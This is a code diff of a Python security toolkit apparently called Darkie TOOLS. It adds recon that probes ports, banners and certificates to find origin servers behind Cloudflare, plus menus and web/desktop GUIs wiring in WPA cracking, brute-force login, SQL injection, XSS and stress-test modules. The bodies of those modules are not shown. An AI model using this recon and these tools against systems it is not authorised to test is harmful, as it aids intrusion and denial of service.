+        if is_ipv6:
+            display_ip = ip
+
+        print(f"\n  {c(display_ip, Fore.GREEN)}")
+
+        if hd["cf"]:
+            print(f"    {c('CLOUDFLARE PROXY', Fore.RED)}")
+        if hd["origin"]:
+            print(f"    {c('ORIGIN SERVER', Fore.GREEN)}")
+        if is_ipv6:
+            print(f"    {c('IPv6', Fore.CYAN)}")
+
+        # Tags
+        tags = set()
+        for p in hd["ports"]:
+            if p in (22, 2022, 2222): tags.add("SSH")
+            if p in (80, 443, 8080, 8443): tags.add("HTTP")
+            if p in (25565, 25566, 19132): tags.add("MINECRAFT")
+        if tags:
+            print(f"    {c('  '.join(sorted(tags)), Fore.MAGENTA)}")
+
+        if ptr_name:
+            print(f"  {dim('PTR')}  {c(ptr_name, Fore.CYAN)}")
+
+        # OS hint (only for origin IPs to save time)
+        os_hint = ""
+        if hd["cf"]:
+            os_hint = "Unknown (Cloudflare proxy)"
+        elif hd["origin"]:
+            for p in hd["ports"]:
+                if p in (22, 2022, 2222):
+                    try:
+                        s = socket.socket(); s.settimeout(1.5); s.connect((ip, p))
+                        s.sendall(b"SSH-2.0-OpenSSH_xxx\r\n"); b = s.recv(64).decode(errors="replace"); s.close()
+                        if "OpenSSH" in b: os_hint = "Linux (Canonical)"; break
+                    except: pass
+        if os_hint:
+            print(f"  {dim('OS')}  {c(os_hint, Fore.CYAN)}")
+
+        # Network + Location
+        if asn:
+            as_str = asn.get("as", "?")
+            org = asn.get("org", "?").split(" - ")[0] if " - " in asn.get("org", "") else asn.get("org", "?")
+            loc = asn.get("city", "") or asn.get("regionName", "") or ""
+            country = asn.get("country", "")
+            loc_str = f"{loc}, {country}" if loc and country else country or loc
+            print(f"  {dim('AS')} {c(as_str, Fore.YELLOW)}  {c(org, Fore.CYAN)}")
+            if loc_str:
+                print(f"  {dim('Location')}  {c(loc_str, Fore.YELLOW)}")
+        elif hd["cf"]:
+            print(f"  {dim('AS')} {c('AS13335 Cloudflare, Inc.', Fore.YELLOW)}")
+            print(f"  {dim('Location')}  {c('Cloudflare (Anycast)', Fore.YELLOW)}")
+
+        # Services
+        if hd["ports"]:
+            print(f"\n  {c('Services', Fore.GREEN)} ({len(hd['ports'])})")
+            for p in sorted(hd["ports"]):
+                svc_name = "?"
+                try: svc_name = socket.getservbyport(p).upper()
+                except: svc_name = {22:"SSH",80:"HTTP",443:"HTTPS",8080:"HTTP",8443:"HTTPS",
+                                   25565:"MINECRAFT",25566:"MINECRAFT",19132:"MINECRAFT",
+                                   2022:"SSH",2222:"SSH",3306:"MYSQL",5432:"POSTGRES",
+                                   6379:"REDIS",27017:"MONGODB",3389:"RDP",5900:"VNC"}.get(p, "TCP")
+                print(f"    {c(f'{p:5d} / {svc_name}', Fore.GREEN)}")
+
+        # Software (only for origin + CF proxy IPs)
+        sw = set()
+        if hd["cf"] or hd["origin"]:
+            for p in hd["ports"]:
+                try:
+                    s = socket.socket(); s.settimeout(1.5); s.connect((ip, p))
+                    try:
+                        ctx = ssl.create_default_context(); ctx.check_hostname = False; ctx.verify_mode = ssl.CERT_NONE
+                        ss = ctx.wrap_socket(s, server_hostname=ip); ss.settimeout(1.5)
+                        cert = ss.getpeercert()
+                        if cert:
+                            for sk, sv in cert.get("subject", []):
+                                if sk == "commonName" and sv: sw.add(f"SSL:{sv}"); break
+                        ss.close()
+                    except:
+                        try:
+                            s.sendall(b"GET / HTTP/1.0\r\nHost: localhost\r\n\r\n")
+                            b = s.recv(256).decode(errors="replace")
+                            for line in b.split("\r\n"):
+                                if line.lower().startswith("server:"): sw.add(line.split(":", 1)[1].strip()); break
+                        except: pass
+                    finally:
+                        try: s.close()
+                        except: pass
+                except: pass
+        if sw:
+            print(f"\n  {c('Software', Fore.GREEN)} ({len(sw)})")
+            for s in sorted(sw): print(f"    {c(s, Fore.CYAN)}")
+
+        # Matched Fields (only for hosts that genuinely match)
+        match = hd["cf"] or hd["origin"] or (domain and any(domain in h for h in hnames))
+        if domain and match:
+            print(f"\n  {c('Matched Fields', Fore.GREEN)}")
+            print(f"    {dim('host.dns.forward_dns.key')}")
+            print(f"      {c(domain, Fore.YELLOW)}")
+            print(f"    {dim('host.dns.forward_dns.value.name')}")
+            print(f"      {c(domain, Fore.YELLOW)}")
+            print(f"    {dim('host.dns.names')}")
+            print(f"      {c(domain, Fore.YELLOW)}")
+
+    # ── Certificates ──
+    if certs:
+        print(f"\n  {c('─'*60, Fore.CYAN)}")
+        print(f"  {c('Certificates', Fore.GREEN)} ({len(certs)})")
+        seen_first = set()
+        for name, issuer, nb, na in certs[:5]:
+            first_name = name.split("\n")[0].strip().lower()
+            if first_name in seen_first: continue
+            seen_first.add(first_name)
+            trust = "expired" if na and na < dt.now().strftime("%Y-%m-%d") else "valid"
+            print(f"\n  {c(first_name, Fore.GREEN)}")
+            print(f"  {dim('Issuer')}:       {issuer}")
+            print(f"  {dim('Validity')}:     {nb or '?'} — {na or '?'}")
+            print(f"  {dim('Trust')}:        {c('Expired' if trust=='expired' else 'Trusted', Fore.RED if trust=='expired' else Fore.GREEN)}")
+            for n in sorted(set(n.strip().lower() for n in name.split("\n") if n.strip()))[:8]:
+                print(f"    {c(n, Fore.GREEN)}")
+
+    # ── Summary ──
+    cf_count = sum(1 for ip in all_ips if hosts.get(ip, {}).get("cf"))
+    origin_count = sum(1 for ip in all_ips if hosts.get(ip, {}).get("origin"))
+    print(f"\n  {c('─'*55, Fore.CYAN)}")
+    print(f"  {c('Summary:', Fore.GREEN)} {c(len(all_ips), Fore.CYAN)} IPs total "
+          f"({c(cf_count, Fore.RED)} CF, {c(origin_count, Fore.GREEN)} origin)")
+    if domain and origin_count == 0:
+        print(f"  {dim('Tip: No origin IPs found. Try searching by IP directly if you know it.')}")
+        print(f"  {dim('Tip: Check the Recon Engine (option 9) for continuous monitoring.')}")
+
+    print()
+
 
 def menu_adv_osint():
     while True:
         header_box("Advanced OSINT", Fore.YELLOW)
         print(f"  {c('[1]', Fore.GREEN)}  Shodan Search")
-        print(f"  {c('[2]', Fore.GREEN)}  Certificate Transparency Log")
-        print(f"  {c('[3]', Fore.GREEN)}  Bitcoin Address Lookup")
-        print(f"  {c('[4]', Fore.GREEN)}  Pastebin Search")
-        print(f"  {c('[5]', Fore.GREEN)}  GitHub Dork Search")
-        print(f"  {c('[6]', Fore.GREEN)}  DNS History Check")
-        print(f"  {c('[7]', Fore.GREEN)}  Wayback Machine Check")
+        print(f"  {c('[2]', Fore.GREEN)}  Censys-Style Deep Recon")
+        print(f"  {c('[3]', Fore.GREEN)}  Certificate Transparency Log")
+        print(f"  {c('[4]', Fore.GREEN)}  Bitcoin Address Lookup")
+        print(f"  {c('[5]', Fore.GREEN)}  Pastebin Search")
+        print(f"  {c('[6]', Fore.GREEN)}  GitHub Dork Search")
+        print(f"  {c('[7]', Fore.GREEN)}  DNS History Check")
+        print(f"  {c('[8]', Fore.GREEN)}  Wayback Machine Check")
+        print(f"  {c('[9]', Fore.GREEN)}  Internet Recon Engine (Censys-style)")
+        print(f"  {c('[10]', Fore.GREEN)} Censys Search (no API key)")
         print(f"  {c('[b]', Fore.CYAN)}   Back")
         print()
-        ch = input(f"  {c(f'Choice {SYM_PROMPT} ', Fore.CYAN)}").strip()
-        if ch == "b": break
-        {"1":osint_shodan,"2":osint_ct_log,"3":osint_btc_lookup,"4":osint_pastebin,
-         "5":osint_github_dork,"6":osint_dns_history,"7":osint_wayback}.get(ch, lambda: print(f"  {RED}Invalid.{RESET}"))()
+        try:
+            ch = input(f"  {c(f'Choice {SYM_PROMPT} ', Fore.CYAN)}").strip()
+            if ch == "b": break
+            {"1":osint_shodan,"2":osint_censys,"3":osint_ct_log,"4":osint_btc_lookup,"5":osint_pastebin,
+             "6":osint_github_dork,"7":osint_dns_history,"8":osint_wayback,"9":osint_recon_engine,"10":osint_censys_search}.get(ch, lambda: print(f"  {RED}Invalid.{RESET}"))()
+        except KeyboardInterrupt:
+            break
+        except Exception as e:
+            print(f"  {RED}{SYM_X} Error: {e}{RESET}")
 
 def menu_wifi():
     while True:
@@ -4846,11 +7675,17 @@ def menu_wifi():
         print(f"  {c('[1]', Fore.GREEN)}  WiFi Network Scanner")
         print(f"  {c('[2]', Fore.GREEN)}  WiFi Security Audit")
         print(f"  {c('[3]', Fore.GREEN)}  Deauth Detection Monitor")
+        print(f"  {c('[4]', Fore.GREEN)}  Password Audit (WPA handshake capture + crack)")
         print(f"  {c('[b]', Fore.CYAN)}   Back")
         print()
-        ch = input(f"  {c(f'Choice {SYM_PROMPT} ', Fore.CYAN)}").strip()
-        if ch == "b": break
-        {"1":wifi_scan,"2":wifi_security_audit,"3":wifi_deauth_monitor}.get(ch, lambda: print(f"  {RED}Invalid.{RESET}"))()
+        try:
+            ch = input(f"  {c(f'Choice {SYM_PROMPT} ', Fore.CYAN)}").strip()
+            if ch == "b": break
+            {"1":wifi_scan,"2":wifi_security_audit,"3":wifi_deauth_monitor,"4":wifi_password_audit}.get(ch, lambda: print(f"  {RED}Invalid.{RESET}"))()
+        except KeyboardInterrupt:
+            break
+        except Exception as e:
+            print(f"  {RED}{SYM_X} Error: {e}{RESET}")
 
 def menu_reports():
     while True:
@@ -4860,61 +7695,726 @@ def menu_reports():
         print(f"  {c('[3]', Fore.GREEN)}  Export to CSV")
         print(f"  {c('[b]', Fore.CYAN)}   Back")
         print()
-        ch = input(f"  {c(f'Choice {SYM_PROMPT} ', Fore.CYAN)}").strip()
-        if ch == "b": break
-        {"1":report_generate,"2":report_export_json,"3":report_export_csv}.get(ch, lambda: print(f"  {RED}Invalid.{RESET}"))()
+        try:
+            ch = input(f"  {c(f'Choice {SYM_PROMPT} ', Fore.CYAN)}").strip()
+            if ch == "b": break
+            {"1":report_generate,"2":report_export_json,"3":report_export_csv}.get(ch, lambda: print(f"  {RED}Invalid.{RESET}"))()
+        except KeyboardInterrupt:
+            break
+        except Exception as e:
+            print(f"  {RED}{SYM_X} Error: {e}{RESET}")
 
 # ──────────────────────────────────────────────────────────
 #  MAIN ENTRY POINT
 # ──────────────────────────────────────────────────────────
 
-def main():
-    print_banner()
-    _ensure_mineflayer()
-    while True:
-        header_box("Darkie TOOLS v2 — Ultimate Cyber Toolkit", Fore.CYAN)
-        print(f"  {c('[1]', Fore.RED)}    Network & Threat Monitoring")
-        print(f"  {c('[2]', Fore.MAGENTA)}  Endpoint Security")
-        print(f"  {c('[3]', Fore.BLUE)}   Vulnerability Management")
-        print(f"  {c('[4]', Fore.YELLOW)}  Data & Access Protection")
-        print(f"  {c('[5]', Fore.GREEN)}   Ethical Hacking & Pentest")
-        print(f"  {c('[6]', Fore.CYAN)}   SIEM & Log Analysis")
-        print(f"  {c('[7]', Fore.RED)}    Stress Testing")
-        print(f"  {c('[8]', Fore.YELLOW)}  OSINT Reconnaissance")
-        print(f"  {c('[9]', Fore.MAGENTA)}  Telephone Tools")
-        print(f"  {c('[10]', Fore.BLUE)}  Network Utilities")
-        print(f"  {c('[11]', Fore.CYAN)}  Hash & Crypto Tools")
-        print(f"  {c('[12]', Fore.RED)}   System Security Audit")
-        print(f"  {c('[13]', Fore.BLUE)}  Advanced Network")
-        print(f"  {c('[14]', Fore.YELLOW)}  Advanced OSINT")
-        print(f"  {c('[15]', Fore.MAGENTA)}  WiFi & Wireless")
-        print(f"  {c('[16]', Fore.CYAN)}  Report Generator")
-        print(f"  {c('[q]', Fore.RED)}    Quit")
-        print()
+# ──────────────────────────────────────────────────────────
+#  GUI: Web Dashboard (Flask) + Desktop App (tkinter)
+#  Integrated directly into the tool — no extra files needed.
+# ──────────────────────────────────────────────────────────
 
-        choice = input(f"  {c(f'Select module {SYM_PROMPT} ', Fore.CYAN)}").strip()
-        if choice == "1": menu_network_threat()
-        elif choice == "2": menu_endpoint()
-        elif choice == "3": menu_vuln()
-        elif choice == "4": menu_data()
-        elif choice == "5": menu_pentest()
-        elif choice == "6": menu_siem()
-        elif choice == "7": menu_stress()
-        elif choice == "8": menu_osint()
-        elif choice == "9": menu_telephone()
-        elif choice == "10": menu_netutils()
-        elif choice == "11": menu_hash_crypto()
-        elif choice == "12": menu_system_audit()
-        elif choice == "13": menu_adv_network()
-        elif choice == "14": menu_adv_osint()
-        elif choice == "15": menu_wifi()
-        elif choice == "16": menu_reports()
-        elif choice.lower() == "q":
-            print(f"\n  {c('Goodbye! Stay secure and ethical.', Fore.GREEN)}\n")
+GUI_MODULES = [
+    {"id": "menu_network_threat", "name": "Network Threat Monitoring"},
+    {"id": "menu_endpoint", "name": "Endpoint Security"},
+    {"id": "menu_vuln", "name": "Vulnerability Management"},
+    {"id": "menu_data", "name": "Data Protection"},
+    {"id": "menu_pentest", "name": "Penetration Testing"},
+    {"id": "menu_siem", "name": "SIEM & Log Analysis"},
+    {"id": "menu_stress", "name": "Stress Testing"},
+    {"id": "menu_osint", "name": "OSINT Reconnaissance"},
+    {"id": "menu_telephone", "name": "Telephone Tools"},
+    {"id": "menu_netutils", "name": "Network Utilities"},
+    {"id": "menu_hash_crypto", "name": "Hash & Crypto"},
+    {"id": "menu_system_audit", "name": "System Audit"},
+    {"id": "menu_adv_network", "name": "Advanced Network"},
+    {"id": "menu_adv_osint", "name": "Advanced OSINT"},
+    {"id": "menu_wifi", "name": "WiFi & Wireless"},
+    {"id": "menu_reports", "name": "Reports"},
+    {"id": "osint_censys_search", "name": "Censys Search"},
+    {"id": "osint_recon_engine", "name": "Recon Engine"},
+]
+
+_WEB_HTML = """<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Darkie TOOLS v3 — Web Dashboard</title>
+<style>
+  * { margin: 0; padding: 0; box-sizing: border-box; }
+  body { font-family: 'Segoe UI', system-ui, sans-serif; background: linear-gradient(135deg, #05070f, #0a0f1f 50%, #05070f); color: #eef3ff; min-height: 100vh; padding: 20px; }
+  .wrap { max-width: 1100px; margin: 0 auto; }
+  h1 { font-size: 26px; font-weight: 800; letter-spacing: -0.5px;
+       background: linear-gradient(90deg, #7c5cff, #00d4ff);
+       -webkit-background-clip: text; background-clip: text; color: transparent;
+       margin-bottom: 4px; }
+  .sub { color: #8a94ad; font-size: 13px; margin-bottom: 18px; }
+  .status { color: #8a94ad; font-size: 12px; margin: 8px 0; font-family: 'Courier New', monospace; }
+  .module-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(210px, 1fr)); gap: 8px; margin-bottom: 18px; }
+  .module-btn { background: rgba(22,33,62,0.7); color: #eef3ff; border: 1px solid rgba(124,92,255,0.35);
+                padding: 11px 14px; cursor: pointer; font-size: 13px; font-weight: 600; text-align: left;
+                border-radius: 10px; transition: all 0.2s; backdrop-filter: blur(4px); }
+  .module-btn:hover { background: rgba(124,92,255,0.25); border-color: #e94560; transform: translateY(-1px); }
+  .module-btn.running { background: linear-gradient(90deg,#e94560,#ff5cc8); color: #fff; border-color: #ff5cc8; }
+  #output { background: rgba(3,5,12,0.85); border: 1px solid rgba(124,92,255,0.3); border-radius: 12px;
+            padding: 16px; height: 48vh; overflow-y: auto; font-size: 13px; line-height: 1.6;
+            white-space: pre-wrap; word-break: break-all; font-family: 'Courier New', monospace; }
+  #output .info { color: #93c5fd; }
+  #output .success { color: #4ade80; }
+  #output .error { color: #ff4444; }
+  #output .warn { color: #ffaa00; }
+  ::-webkit-scrollbar { width: 8px; background: #0d0d1a; }
+  ::-webkit-scrollbar-thumb { background: #533483; border-radius: 4px; }
+  .toolbar { display: flex; justify-content: space-between; align-items: center; margin-bottom: 12px; }
+  .clear-btn { background: rgba(255,255,255,0.06); color: #eef3ff; border: 1px solid rgba(255,255,255,0.15);
+               padding: 8px 16px; cursor: pointer; border-radius: 10px; font-size: 12px; font-weight: 600; transition: all 0.2s; }
+  .clear-btn:hover { background: #e94560; border-color: #e94560; }
+  .title-bar { display: flex; align-items: center; gap: 10px; margin-bottom: 4px; }
+  .dot { width: 11px; height: 11px; border-radius: 50%; display: inline-block; }
+  .footer { margin-top: 20px; text-align: center; color: #8a94ad; font-size: 12px; }
+</style>
+</head>
+<body>
+<div class="wrap">
+<div class="title-bar">
+  <span class="dot" style="background:#ff5f57"></span><span class="dot" style="background:#febc2e"></span><span class="dot" style="background:#28c840"></span>
+</div>
+<h1>Darkie TOOLS v3 — Web Dashboard</h1>
+<div class="sub">Click a module to run it. Output streams live below.</div>
+<div class="status">Connected. Select a module to run.</div>
+<div class="module-grid" id="modules"></div>
+<div class="toolbar">
+  <h3 style="color:#00ccff;font-size:14px;">▸ Output</h3>
+  <button class="clear-btn" onclick="clearOutput()">Clear Output</button>
+</div>
+<pre id="output"></pre>
+<div class="footer">Darkie Security Suite v3 — educational use only</div>
+</div>
+<script>
+const modules = MODULES_PLACEHOLDER;
+const grid = document.getElementById('modules');
+modules.forEach(m => {
+  const btn = document.createElement('button');
+  btn.className = 'module-btn';
+  btn.textContent = m.name;
+  btn.onclick = () => runModule(m.id, btn);
+  grid.appendChild(btn);
+});
+function runModule(id, btn) {
+  btn.classList.add('running');
+  btn.disabled = true;
+  const out = document.getElementById('output');
+  out.innerHTML += '<span class="info">[+] Running ' + id + '...</span>\\n';
+  out.scrollTop = out.scrollHeight;
+  fetch('/run/' + id).then(r => r.json()).then(d => {
+    btn.classList.remove('running');
+    btn.disabled = false;
+    if (d.error) out.innerHTML += '<span class="error">[!] ' + d.error + '</span>\\n';
+  });
+}
+let lastLen = 0;
+setInterval(() => {
+  fetch('/output').then(r => r.json()).then(d => {
+    const out = document.getElementById('output');
+    if (d.lines && d.lines.length > lastLen) {
+      for (let i = lastLen; i < d.lines.length; i++) {
+        const cls = d.tags[i] || 'info';
+        out.innerHTML += '<span class="' + cls + '">' + escapeHtml(d.lines[i]) + '</span>\\n';
+      }
+      lastLen = d.lines.length;
+      out.scrollTop = out.scrollHeight;
+    }
+  });
+}, 300);
+function clearOutput() {
+  document.getElementById('output').innerHTML = '';
+  fetch('/clear').then(r => r.json());
+  lastLen = 0;
+}
+function escapeHtml(s) { return s.replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;'); }
+</script>
+</body>
+</html>"""
+
+
+def start_web_gui(host="127.0.0.1", port=5000):
+    """Run the clickable web dashboard in a browser (no extra files)."""
+    import builtins
+    import io as _io
+    try:
+        from flask import Flask, jsonify
+    except ImportError:
+        print(f"  {RED}{SYM_X} Flask is required for the Web Dashboard. Install: pip install flask{RESET}")
+        return
+    app = Flask(__name__)
+    current_output = []
+
+    def _index():
+        return _WEB_HTML.replace("MODULES_PLACEHOLDER", json.dumps(GUI_MODULES))
+
+    def _run_module(module_id):
+        func = globals().get(module_id)
+        if not func:
+            return jsonify({"error": f"Module {module_id} not found"})
+
+        def wrapper():
+            old_out = sys.stdout
+            old_input = builtins.input
+            buf = _io.StringIO()
+            sys.stdout = buf
+
+            def auto_input(prompt=""):
+                current_output.append(("warn", f"[prompt] {prompt}"))
+                if module_id == "osint_censys_search":
+                    return ""
+                if module_id.startswith("menu_") or module_id in ("osint_recon_engine",):
+                    return "b"
+                return ""
+
+            builtins.input = auto_input
+            try:
+                func()
+            except Exception as e:
+                print(f"Error: {e}")
+            finally:
+                builtins.input = old_input
+                sys.stdout = old_out
+                for line in buf.getvalue().splitlines():
+                    current_output.append(("info", line))
+            current_output.append(("info", f"[+] {module_id} completed"))
+
+        threading.Thread(target=wrapper, daemon=True).start()
+        return jsonify({"status": "started"})
+
+    def _output():
+        lines = [l for _, l in current_output[-500:]]
+        tags = [t for t, _ in current_output[-500:]]
+        return jsonify({"lines": lines, "tags": tags})
+
+    def _clear():
+        current_output.clear()
+        return jsonify({"status": "ok"})
+
+    app.add_url_rule("/", "index", _index)
+    app.add_url_rule("/run/<module_id>", "run_module", _run_module)
+    app.add_url_rule("/output", "output", _output)
+    app.add_url_rule("/clear", "clear", _clear)
+
+    try:
+        import webbrowser
+        webbrowser.open(f"http://{host}:{port}")
+    except Exception:
+        pass
+    print(f"\n  {c('Web Dashboard started', Fore.GREEN)}")
+    print(f"  {c('Open in your browser:', Fore.CYAN)} http://{host}:{port}")
+    print(f"  {c('Press Ctrl+C to return to the menu.', Fore.YELLOW)}\n")
+    try:
+        app.run(host=host, port=port, debug=False)
+    except KeyboardInterrupt:
+        print(f"\n  {c('Web Dashboard stopped.', Fore.YELLOW)}")
+
+
+def start_desktop_gui():
+    """Run the clickable desktop app window (tkinter, no extra files)."""
+    try:
+        import tkinter as tk
+        from tkinter import ttk, scrolledtext
+    except Exception:
+        print(f"  {RED}{SYM_X} tkinter is not available on this system.{RESET}")
+        print(f"  {YELLOW}  Linux:  sudo apt install python3-tk   |   macOS:  brew install python-tk{RESET}")
+        print(f"  {YELLOW}  Tip: option [1] of the GUI menu opens the web dashboard instead.{RESET}")
+        return
+    import builtins
+    import io as _io
+    from queue import Queue
+
+    _BG = "#1a1a2e"
+    _BG2 = "#16213e"
+    _FG = "#e94560"
+    _ACCENT = "#533483"
+    _TEXT = "#eee"
+    _GREEN = "#00ff88"
+    _RED = "#ff4444"
+    _YELLOW = "#ffaa00"
+    _CYAN = "#00ccff"
+    _ANSI_RE = re.compile(r'\x1b\[[0-9;]*m')
+
+    def _strip_ansi(s):
+        return _ANSI_RE.sub('', s)
+
+    def _run_in_thread(target, args=(), kwargs=None):
+        threading.Thread(target=target, args=args, kwargs=kwargs or {}, daemon=True).start()
+
+    class _OutputRedirect(_io.StringIO):
+        def __init__(self, queue):
+            super().__init__()
+            self.queue = queue
+
+        def write(self, s):
+            if s.strip():
+                self.queue.put(_strip_ansi(s))
+            super().write(s)
+
+        def flush(self):
+            pass
+
+    class _PromptBridge:
+        def __init__(self, root):
+            self.root = root
+            self._result = None
+            self._event = threading.Event()
+
+        def ask(self, prompt=""):
+            self._event.clear()
+            self._result = None
+            self.root.after(0, self._show, prompt)
+            self._event.wait()
+            return self._result
+
+        def _show(self, prompt):
+            from tkinter import simpledialog
+            text = prompt.strip() or "Input"
+            self._result = simpledialog.askstring("Darkie Security Suite", text, parent=self.root)
+            self._event.set()
+
+    class _DarkieGUI:
+        def __init__(self, root):
+            self.root = root
+            self.prompt = _PromptBridge(self.root)
+            self.module_lock = threading.Lock()
+            self.root.title("Darkie Security Suite v3")
+            self.root.geometry("1100x780")
+            self.root.configure(bg=_BG)
+            self.root.minsize(900, 650)
+
+            style = ttk.Style()
+            style.theme_use("clam")
+            style.configure("TNotebook", background=_BG, borderwidth=0)
+            style.configure("TNotebook.Tab", background=_BG2, foreground=_TEXT, padding=[10, 5], font=("Segoe UI", 10, "bold"))
+            style.map("TNotebook.Tab", background=[("selected", _ACCENT)], foreground=[("selected", _FG)])
+            style.configure("TFrame", background=_BG)
+            style.configure("TLabel", background=_BG, foreground=_TEXT, font=("Segoe UI", 10))
+            style.configure("TButton", background=_ACCENT, foreground=_TEXT, font=("Segoe UI", 10, "bold"), padding=[8, 4])
+            style.map("TButton", background=[("active", _FG)])
+            style.configure("TEntry", fieldcolor=_BG2, foreground=_TEXT, insertcolor=_TEXT, font=("Consolas", 11))
+            style.configure("TLabelframe", background=_BG, foreground=_TEXT)
+            style.configure("TLabelframe.Label", background=_BG, foreground=_CYAN, font=("Segoe UI", 10, "bold"))
+
+            self.notebook = ttk.Notebook(self.root)
+            self.notebook.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)
+
+            self.tabs = {}
+            self.out_queues = {}
+            self.stop_events = {}
+
+            modules = [
+                ("Network Threat", self._build_network_threat),
+                ("Endpoint", self._build_endpoint),
+                ("Vulnerability", self._build_vuln),
+                ("Data Protection", self._build_data),
+                ("Pentest", self._build_pentest),
+                ("SIEM", self._build_siem),
+                ("Stress Test", self._build_stress),
+                ("OSINT", self._build_osint),
+                ("Telephone", self._build_telephone),
+                ("Net Utils", self._build_netutils),
+                ("Hash & Crypto", self._build_hash_crypto),
+                ("Security Audit", self._build_audit),
+                ("Adv Network", self._build_adv_network),
+                ("Adv OSINT", self._build_adv_osint),
+                ("WiFi", self._build_wifi),
+                ("Reports", self._build_reports),
+                ("Console", self._build_console),
+            ]
+            for name, builder in modules:
+                frame = ttk.Frame(self.notebook)
+                self.notebook.add(frame, text=f" {name} ")
+                self.tabs[name] = frame
+                self.out_queues[name] = Queue()
+                self.stop_events[name] = threading.Event()
+                builder(frame)
+
+            self._poll_queues()
+
+        def _output_widget(self, parent):
+            txt = scrolledtext.ScrolledText(parent, wrap=tk.WORD, height=12,
+                                             bg=_BG2, fg=_TEXT, insertbackground=_TEXT,
+                                             font=("Consolas", 10), state=tk.DISABLED)
+            txt.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)
+            return txt
+
+        def _add_output(self, parent, label="Output"):
+            frame = ttk.LabelFrame(parent, text=f" {label} ")
+            frame.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)
+            return self._output_widget(frame)
+
+        def _add_button_row(self, parent, buttons, row_frame=None):
+            if row_frame is None:
+                row_frame = ttk.Frame(parent)
+            row_frame.pack(fill=tk.X, padx=5, pady=3)
+            for text, cmd in buttons:
+                b = ttk.Button(row_frame, text=text, command=cmd)
+                b.pack(side=tk.LEFT, padx=3)
+
+        def _poll_queues(self):
+            for name, q in self.out_queues.items():
+                try:
+                    while True:
+                        line = q.get_nowait()
+                        tab = self.tabs.get(name)
+                        if tab:
+                            for child in tab.winfo_children():
+                                if isinstance(child, ttk.LabelFrame):
+                                    for sub in child.winfo_children():
+                                        if isinstance(sub, scrolledtext.ScrolledText):
+                                            sub.configure(state=tk.NORMAL)
+                                            sub.insert(tk.END, line + "\n")
+                                            sub.see(tk.END)
+                                            sub.configure(state=tk.DISABLED)
+                except Exception:
+                    pass
+            self.root.after(100, self._poll_queues)
+
+        def _run_module(self, name, func):
+            if not self.module_lock.acquire(blocking=False):
+                self.root.after(0, lambda: self.log("A module is already running — finish or cancel it first."))
+                return
+            self.out_queues[name] = Queue()
+            old_stdout = sys.stdout
+            old_input = builtins.input
+            sys.stdout = _OutputRedirect(self.out_queues[name])
+            builtins.input = self.prompt.ask
+
+            def wrapper():
+                try:
+                    func()
+                except Exception as e:
+                    print(f"Error: {e}")
+                finally:
+                    builtins.input = old_input
+                    sys.stdout = old_stdout
+                    self.module_lock.release()
+
+            _run_in_thread(wrapper)
+
+        def _make_entry(self, parent, label, default="", row=0, col=0, label_col=0):
+            f = ttk.Frame(parent)
+            f.pack(fill=tk.X, padx=5, pady=2)
+            ttk.Label(f, text=label, width=20).pack(side=tk.LEFT)
+            var = tk.StringVar(value=default)
+            e = ttk.Entry(f, textvariable=var)
+            e.pack(side=tk.LEFT, fill=tk.X, expand=True, padx=5)
+            return var
+
+        def _build_network_threat(self, parent):
+            self._add_button_row(parent, [
+                ("Capture", lambda: self._run_module("Network Threat", net_capture)),
+                ("Traffic Monitor", lambda: self._run_module("Network Threat", net_traffic_monitor)),
+                ("IDS", lambda: self._run_module("Network Threat", net_ids)),
+                ("ARP Detect", lambda: self._run_module("Network Threat", net_arp_detect)),
+                ("Port Scan Detect", lambda: self._run_module("Network Threat", net_portscan_detect)),
+                ("DDoS Detect", lambda: self._run_module("Network Threat", net_ddos_detect)),
+            ])
+            self._add_output(parent)
+
+        def _build_endpoint(self, parent):
+            self._add_button_row(parent, [
+                ("Process Monitor", lambda: self._run_module("Endpoint", ep_process_monitor)),
+                ("Suspicious Procs", lambda: self._run_module("Endpoint", ep_suspicious_processes)),
+                ("File Integrity", lambda: self._run_module("Endpoint", ep_file_integrity)),
+                ("Net Connections", lambda: self._run_module("Endpoint", ep_network_connections)),
+            ])
+            self._add_output(parent)
+
+        def _build_vuln(self, parent):
+            self._add_button_row(parent, [
+                ("Advanced Scan", lambda: self._run_module("Vulnerability", vuln_advanced_scan)),
+                ("CVE Lookup", lambda: self._run_module("Vulnerability", vuln_cve_lookup)),
+                ("Assessment", lambda: self._run_module("Vulnerability", vuln_assessment)),
+                ("Config Check", lambda: self._run_module("Vulnerability", vuln_config_check)),
+            ])
+            self._add_output(parent)
+
+        def _build_data(self, parent):
+            self._add_button_row(parent, [
+                ("Encrypt", lambda: self._run_module("Data Protection", data_encrypt)),
+                ("Decrypt", lambda: self._run_module("Data Protection", data_encrypt)),
+                ("Hash Generator", lambda: self._run_module("Data Protection", hash_generator)),
+                ("Password Strength", lambda: self._run_module("Data Protection", data_password_strength)),
+            ])
+            self._add_output(parent)
+
+        def _build_pentest(self, parent):
+            self._add_button_row(parent, [
+                ("Port Scan", lambda: self._run_module("Pentest", legacy_portscan)),
+                ("Service Enum", lambda: self._run_module("Pentest", vuln_advanced_scan)),
+                ("Brute Force", lambda: self._run_module("Pentest", pentest_bruteforce_login)),
+                ("SQL Injection", lambda: self._run_module("Pentest", pentest_sqli)),
+                ("XSS", lambda: self._run_module("Pentest", pentest_xss)),
+            ])
+            self._add_output(parent)
+
+        def _build_siem(self, parent):
+            self._add_button_row(parent, [
+                ("Log Analyzer", lambda: self._run_module("SIEM", siem_log_analyzer)),
+                ("Threat Patterns", lambda: self._run_module("SIEM", siem_threat_patterns)),
+                ("Alert Viewer", lambda: self._run_module("SIEM", siem_alert_viewer)),
+                ("Realtime Monitor", lambda: self._run_module("SIEM", siem_realtime_monitor)),
+            ])
+            self._add_output(parent)
+
+        def _build_stress(self, parent):
+            self._add_button_row(parent, [
+                ("Stress Test Menu", lambda: self._run_module("Stress Test", menu_stress)),
+                ("Find MC Ports", lambda: self._run_module("Stress Test",
+                                                           lambda: mc_find_ports(input("Target IP: ")))),
+            ])
+            self._add_output(parent)
+
+        def _build_osint(self, parent):
+            self._add_button_row(parent, [
+                ("Menu", lambda: self._run_module("OSINT", menu_osint)),
+                ("Shodan", lambda: self._run_module("OSINT", osint_shodan)),
